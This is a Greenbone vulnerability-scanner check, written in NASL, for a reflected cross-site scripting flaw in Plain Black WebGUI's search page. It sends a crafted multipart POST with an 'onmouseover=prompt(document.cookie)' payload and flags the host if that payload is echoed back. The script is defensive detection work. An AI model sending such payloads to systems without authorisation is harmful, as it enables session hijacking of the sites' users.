if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.802090" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_bugtraq_id( 72253 );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2015-01-23 11:27:32 +0530 (Fri, 23 Jan 2015)" );
	script_name( "Plain Black WebGUI 'search' Cross-Site Scripting Vulnerability" );
	script_tag( name: "summary", value: "This host is installed with Plain Black
  WebGUI and is prone to cross-site scripting vulnerability." );
	script_tag( name: "vuldetect", value: "Send a crafted HTTP GET request and check
  whether it is able read the cookie or not." );
	script_tag( name: "insight", value: "The error exists as the style_underground/search
  script does not validate input before returning it to users." );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to
  execute arbitrary HTML and script code in a user's browser session in the context
  of an affected site." );
	script_tag( name: "affected", value: "Plain Black WebGUI version 7.10.29.
  Previous version maybe vulnerable also." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one." );
	script_xref( name: "URL", value: "http://packetstormsecurity.com/files/130005" );
	script_xref( name: "URL", value: "http://seclists.org/fulldisclosure/2015/Jan/79" );
	script_xref( name: "URL", value: "http://secupent.com/exploit/WebGUI-7.10.29-XSS.txt" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2015 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
http_port = http_get_port( default: 80 );
host = http_host_name( port: http_port );
for dir in nasl_make_list_unique( "/", "/WebGUI", "/webgui", http_cgi_dirs( port: http_port ) ) {
	if(dir == "/"){
		dir = "";
	}
	url = dir + "/style-underground/search";
	sndReq = http_get( item: url, port: http_port );
	rcvRes = http_keepalive_send_recv( port: http_port, data: sndReq );
	if(rcvRes && ContainsString( rcvRes, ">WebGUI Links<" )){
		cookie = eregmatch( pattern: "Cookie: (wgSession=.*; path=)", string: rcvRes );
		if(cookie){
			cookie = cookie[0] - "; path=";
		}
		postdata = NASLString( "-----------------------------99533922720439277032114782214\\r\\n", "Content-Disposition: form-data; name=\"doit\"\r\n", "\r\n", "1\r\n", "-----------------------------99533922720439277032114782214\r\n", "Content-Disposition: form-data; name=\"keywords\"\r\n", "\r\n", "1\" onmouseover=prompt(document.cookie) bad=\"\r\n", "-----------------------------99533922720439277032114782214--\r\n" );
		sndReq = NASLString( "POST ", url, " HTTP/1.1\r\n", "Host: ", host, "\r\n", "Referer: http://", host, dir, "/style-underground/search\r\n", cookie, "\r\n", "Content-Type: multipart/form-data; boundary=---------------------------99533922720439277032114782214\r\n", "Content-Length: ", strlen( postdata ), "\r\n\r\n", postdata );
		rcvRes = http_keepalive_send_recv( port: http_port, data: sndReq );
		if(rcvRes && ContainsString( rcvRes, "onmouseover=prompt(document.cookie)" ) && ContainsString( rcvRes, ">WebGUI Links<" )){
			security_message( port: http_port );
			exit( 0 );
		}
	}
}
exit( 99 );

